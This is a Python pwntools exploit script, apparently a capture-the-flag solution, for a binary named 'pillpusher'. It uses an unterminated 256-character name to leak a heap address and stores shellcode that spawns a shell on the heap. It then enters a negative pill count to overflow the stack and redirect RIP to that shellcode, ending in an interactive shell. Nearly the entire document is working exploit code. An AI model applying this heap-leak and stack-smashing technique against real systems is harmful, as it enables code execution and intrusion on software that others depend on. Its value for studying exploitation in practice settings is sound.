#!/usr/bin/env python2

# bugs:
# enter a pill with name is 256 chars: leak heap address
# enter a negative number when adding pills to a script: overflow stack, smash RIP


# to overflow RIP:
# 2 255 char name pills, then 10 chars of padding then new RIP
# store shellcode on heap
from pwn import *
context.arch = 'amd64'
#context.log_level = 'DEBUG'

shellcode = asm(shellcraft.sh())
r = process("./pillpusher")
#r = process("linux_serverx64")
r.recvuntil("-> ")

def add_pill(name, treats):
    r.sendline("2")
    r.sendline("1")
    r.recvuntil(": ")
    if len(name) != 256:
        r.sendline(name)
    else:
        r.send(name)
    r.sendline()
    r.sendline('100')
    for t in treats:
        r.sendline(t)
    r.sendline()
    r.sendline()
    r.sendline()
    r.recvuntil("-> ")
    r.sendline("6")
    r.recvuntil("-> ")

p1 = 'a' * 255
leaky = 'a' * 256
scpill = shellcode

# leak and place shellcode on the heap
add_pill(leaky, [])
add_pill(scpill, [])

# leak heap address, resolve
r.sendline("2")
r.recvuntil("-> ")
r.sendline("3")
r.recvuntil("Name: " + 'a' * 256)
heap_addr = u64(r.recvn(6) + "\x00\x00")
sc_addr = heap_addr + 456
log.info("Heap address: " + hex(heap_addr))
log.info("Shellcode address: " + hex(sc_addr))

p3 = '\x02' * 10 + p64(sc_addr) # use \x02 so trap flag doesn't get set
add_pill(p1, ["test"])
add_pill(p3, ["test"])

# add a pharmacist
r.sendline("3")
r.sendline("1")
r.recvuntil(": ")
r.sendline("poopie")
r.sendline("1000")
r.recvuntil("-> ")
r.sendline("5")
r.recvuntil("-> ")

# add a patient
r.sendline("4")
r.sendline("1")
r.recvuntil(": ")
r.sendline("bobby")
r.sendline()
r.sendline("test")
r.sendline()
r.recvuntil("-> ")
r.sendline("5")
r.recvuntil("-> ")

# add pharma
r.sendline("1")
r.sendline("1")
r.recvuntil("name? ")
r.sendline("big")
r.sendline(p1)
r.sendline(p3)
r.sendline()
r.sendline("poopie")
r.sendline()

# dbg
#r.sendline("4")
#print r.recvall()
r.recvuntil("-> ")
r.sendline("5")
# now make the scrip, smash!!!
r.sendline("5")
r.recvuntil("-> ")
r.sendline("1")
r.sendline("big")
r.recvuntil("-> ")
r.sendline("2")
r.sendline("1")
r.recvuntil("-> ")
r.sendline("3")
r.sendline("bobby")
r.recvuntil("-> ")
r.sendline("4")
r.recvuntil(": ")
r.sendline("-1")
r.recvuntil("pill: ")
r.sendline(p1)
r.recvuntil("pill: ")
r.sendline(p1)
r.recvuntil("pill: ")
r.sendline(p3)
r.recvuntil("pill: ")
r.sendline()
r.interactive()
